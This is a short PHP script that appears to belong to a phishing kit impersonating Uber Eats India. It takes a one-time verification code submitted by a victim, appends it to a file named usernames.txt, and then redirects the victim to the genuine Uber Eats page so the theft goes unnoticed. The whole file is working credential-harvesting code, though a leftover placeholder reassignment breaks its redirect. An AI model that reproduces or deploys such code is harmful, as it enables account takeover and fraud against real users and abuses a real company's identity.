<?php
file_put_contents("usernames.txt", "OTP: " . $_POST["verificationCode"] . "\n", FILE_APPEND);
$url = "redirectUrl";
if ($url === "redirectUrl") {
  $url = "https://www.ubereats.com/en-IN/";
}
$url = "redirectUrl"; # https://www.ubereats.com/en-IN/
header("Location: $url");
exit();
?>